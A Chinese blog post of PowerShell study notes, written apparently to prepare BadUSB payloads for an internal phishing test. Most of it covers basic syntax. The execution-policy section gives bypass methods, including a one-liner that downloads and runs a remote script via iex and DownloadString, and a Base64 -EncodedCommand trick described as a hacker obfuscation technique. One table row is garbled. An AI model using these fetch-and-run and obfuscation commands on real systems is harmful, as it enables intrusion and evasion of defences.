---
title: powershell 黑客手法
description: 公司需要展开一个钓鱼的内部测试，看到黑客军团里面主角用badusb做跳板，感觉挺不错的，想试试。
categories: 
 - 杂项
---

# 前言

在准备用badusb制作一个可以有实际作用的时候，发现需要精心构造一个powershell,所以决定学习下这个骚操作，博客用于记录方便以后回顾。

# poweshell 基本语法

## 前述知识
powershell 的后缀是Ps1，那么咋不是ps2,ps3,ps4呢(ps4还真的有，暗魂赛高。)，powershell是向下完全兼容的，也就是说你使用powershell 5.x版本来运行ps1是完全可行的(这不是废话？)
当然对于安全人员来讲，对于我们学习一个技术可不是仅仅为了编程，搞事情，搞事情！
1. 第一种我们需要获得免杀或者更好的隐蔽攻击对方win机器，可以通过钓鱼等方式直接执行命令
2. 第二种我们已经到了对方网络，再不济也是一台dmz的win-server，那么我们利用Ps做的事情自然是内网穿透

## 变量
变量都是以 $ 开头，是强类型语言，不区分大小写。
```
PS C:\Users\Administrator> $a = get-host
PS C:\Users\Administrator> $a


Name             : ConsoleHost
Version          : 5.0.10586.63
InstanceId       : a8044a5e-f2d7-4697-8fac-380221ffa4ce
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : zh-CN
CurrentUICulture : zh-CN
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace



PS C:\Users\Administrator> $A


Name             : ConsoleHost
Version          : 5.0.10586.63
InstanceId       : a8044a5e-f2d7-4697-8fac-380221ffa4ce
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : zh-CN
CurrentUICulture : zh-CN
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace
```
··· 着重说一下变量保护与常量声明

`New-Variable num -Value 100 -Force -Option readonly`   受保护的变量
`New-Variable num -Value 100 -Force -Option constant`   常量声明

## 数组
### 数组的创建：
    数组的创建可以通过下面五种方式来创建
    ```
    $array = 1,2,3,4
    $array = 1..4
    $array = 1,"2017",([System.Guid]::NewGuid()),(get-date)
    $a=@()  空数组
    $a = ,"1" 一个元素的数组
    ```
### 数组的访问
    数组的访问与c类似，第一位元素使用下标0来访问及$array[0]
    ```
    $ip = ipconfig
    $ip[1]  获取ipconfig第二行的数据
    PS C:\Users\Administrator> $ip = ipconfig
    PS C:\Users\Administrator> $ip[1]
    Windows IP 配置
    
    ```
### 数组的判断 
    $test -is [array]

### 数组的追加
    $test += "元素4"

## 哈希表
### 哈希表的创建
    $stu = @{Name="test";Age="12";sex="man"} 

### 哈希表里寸数组
    $stu=@{ Name = "hei";Age="12";sex="man";Books="kali","sqlmap","powershell" }

### 哈希表的插入与删除
    $Student=@{}
    $Student.Name="hahaha"
    $stu.Remove("Name")
    ```
    PS C:\Users\Administrator> $stu =@{}
    PS C:\Users\Administrator> $stu
    PS C:\Users\Administrator> $stu.name="lihua"
    PS C:\Users\Administrator> $stu

Name                           Value
----                           -----
name                           lihua


    PS C:\Users\Administrator> $stu.remove("name")
    PS C:\Users\Administrator> $stu
    ```

## 对象
 在powershell 中一切都可以视为对象，包罗万象New-Object可以创建一个对象Add-Member可以添加属性和方法。

## 控制语句
### 比较运算符
-eq ：等于
-ne ：不等于
-gt ：大于
-ge ：大于等于
-lt ：小于
-le ：小于等于
-contains ：包含
$array -contains something
​
-notcontains :不包含
!($a): 求反
-and ：和
-or ：或
-xor ：异或
-not ：逆

### if-else:
if($value -eq 1){
    code1
}else{
    code2
}

### while 

while($n -gt 0){
    code
}

### for

$sum=0
for($i=1;$i -le 100;$i++)
{
    $sum+=$i
}
$sum

### foreach

 打印出windows目录下大于1mb的文件名
foreach($file in dir c:windows)
{
    if($file.Length -gt 1mb)
    {
        $File.Name
    }
}

### foreach-object 

获取所有的服务，并获取对进程id是否大于100

`Get-WmiObject Win32_Service | ForEach-Object {"Name:"+ $_.DisplayName, ", Is ProcessId more than 100:" + ($_.ProcessId -gt 100)}`

```
Name:WinHTTP Web Proxy Auto-Discovery Service , Is ProcessId more than 100:True
Name:Windows Management Instrumentation , Is ProcessId more than 100:False
Name:Windows Remote Management (WS-Management) , Is ProcessId more than 100:False
Name:WLAN AutoConfig , Is ProcessId more than 100:False
Name:Microsoft Account Sign-in Assistant , Is ProcessId more than 100:False
Name:WMI Performance Adapter , Is ProcessId more than 100:False
Name:Windows Media Player Network Sharing Service , Is ProcessId more than 100:False
Name:Work Folders , Is ProcessId more than 100:False
Name:Portable Device Enumerator Service , Is ProcessId more than 100:False
Name:Windows Push Notifications Service , Is ProcessId more than 100:False
Name:WPS Office Cloud Service , Is ProcessId more than 100:False
Name:Security Center , Is ProcessId more than 100:False
Name:Windows Search , Is ProcessId more than 100:True
Name:Windows Store Service (WSService) , Is ProcessId more than 100:False
Name:Windows Update , Is ProcessId more than 100:False
Name:Windows Driver Foundation - User-mode Driver Framework , Is ProcessId more than 100:True
Name:WWAN AutoConfig , Is ProcessId more than 100:False
Name:Xbox Live 身份验证管理器 , Is ProcessId more than 100:False
Name:Xbox Live 游戏保存 , Is ProcessId more than 100:False
```


### 函数
```
function Invoke-PortScan {
<#
.SYNOPSIS 
简介
​
.DESCRIPTION
描述
    
.PARAMETER StartAddress
参数
​
.PARAMETER EndAddress
参数
​
.EXAMPLE
PS > Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254
用例
#>
code
}
```

### 异常处理
```
Try{
    $connection.open()
    $success = $true
}Catch{
    $success = $false
}
```
# powershell 脚本执行基础
## bat

bat 就是 批处理文件，脚本中就是我们在cmd中使用的命令，有个小插曲，cmd的命令行执行命令的优先级是.bat > .ext ,假如我们在system32目录，放一个cmd.bat，那么优先执行的是cmd.bat。

## vbscript

执行 vbs就是常用的vbscript ，是微软放了方便自动化管理windows突出的脚本语言。

```vb
Set wmi = GetObject("winmgmts:")
Set collection = wmi.ExecQuery("select * from Win32_Process")
For Each process in collection
WScript.Echo process.getObjectText_
Next
```

## powershell 

在处理应急响应的事件中，黑客对于windows的手法 多数用到了poweshell，想必是未来的主角
script.ps1
#脚本内容
function test-conn{Test-Connection -Count 4 -ComputerName $args}
#载入脚本
.script.ps1
#调用脚本
test-conn localhost


## powershell 执行策略

那么你可能会在调用脚本的时候出现报错，这是powershell的安全执行策略。提供了六种类型的安全执行策略

1. Restricted	受限制的，可以执行单个的命令，但是不能执行脚本Windows 8, Windows Server 2012, and Windows 8.1中默认就是这种策略，所以是不能执行脚本的，执行就会报错，那么如何才能执行呢？Set-ExecutionPolicy -ExecutionPolicy Bypass就是设置策略为Bypass这样就可以执行脚本了。
2. AllSigned	AllSigned 执行策略允许执行所有具有数字签名的脚本
3. RemoteSigned	当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。
4. Unrestricted	这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。需要你确认是否执行脚本
5. Bypass	Bypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。
6. Undefined	Undefined 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略。

绕过安全执行策略

1. Get-ExecutionPolicy  获取当前的执行策略
2. Get-Content .test.ps1 | powershell.exe -noprofile –   通过管道输入进ps
3. powershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘http://192.168.1.2/test.ps1‘)”    #通过远程下载脚本来绕过|​bytes = [System.Text.Encoding]::Unicode.GetBytes(​encodedCommand =[Convert]::ToBase64String(​encodedCommand|通过BASE64编码执行|

## 通过控制台执行powershell

对于安全测试人员通常获得的一个shell是cmd的，那么我们想要尽可能少的操作就可以直接通过控制台来执行powershell 的命令
 ` powershell -command "get-host" `
 
该命令通过cmd界面执行了powershell的代码，其实这样的执行方式在真是的安全测试环境中利用更多。

```
PowerShell[.exe]
       [-PSConsoleFile <file> | -Version <version>]
       [-EncodedCommand <Base64EncodedCommand>]
       [-ExecutionPolicy <ExecutionPolicy>]
       [-File <filePath> <args>]
       [-InputFormat {Text | XML}] 
       [-NoExit]
       [-NoLogo]
       [-NonInteractive] 
       [-NoProfile] 
       [-OutputFormat {Text | XML}] 
       [-Sta]
       [-WindowStyle <style>]
       [-Command { - | <script-block> [-args <arg-array>]
                     | <string> [<CommandParameters>] } ]
​
PowerShell[.exe] -Help | -? | /?
名称	解释
-Command	需要执行的代码
-ExecutionPolicy	设置默认的执行策略，一般使用Bypass
-EncodedCommand	    执行Base64代码
-File	            这是需要执行的脚本名
-NoExit	执行完成命令之后不会立即退出，比如我们执行powerhsell whoami 执行完成之后会推出我们的PS会话，如果我们加上这个参数，运行完之后还是会继续停留在PS的界面
-NoLogo	不输出PS的Banner信息
-Noninteractive	不开启交互式的会话
-NoProfile	不使用当前用户使用的配置文件
-Sta	以单线程模式启动ps
-Version	设置用什么版本去执行代码
-WindowStyle	设置Powershell的执行窗口，有下面的参数Normal, Minimized, Maximized, or Hidden
```

举个例子
1. 我们先试用上面的一个表格提到的编码代码EncodeCommand 命令 执行whoami ,whomai 64编码 dwBoAG8AYQBtAGkACgA=
2. 执行命令 ` powershell -EncodedCommand dwBoAG8AYQBtAGkACgA= `
该方法可以 混淆代码，也是常用的黑客手法之一。




# powershell 命令合集
get-host
```
Name             : ConsoleHost
Version          : 5.0.10586.63
InstanceId       : 5a066c1d-1538-44d1-862a-2793b152ecff
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : zh-CN
CurrentUICulture : zh-CN
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace
```

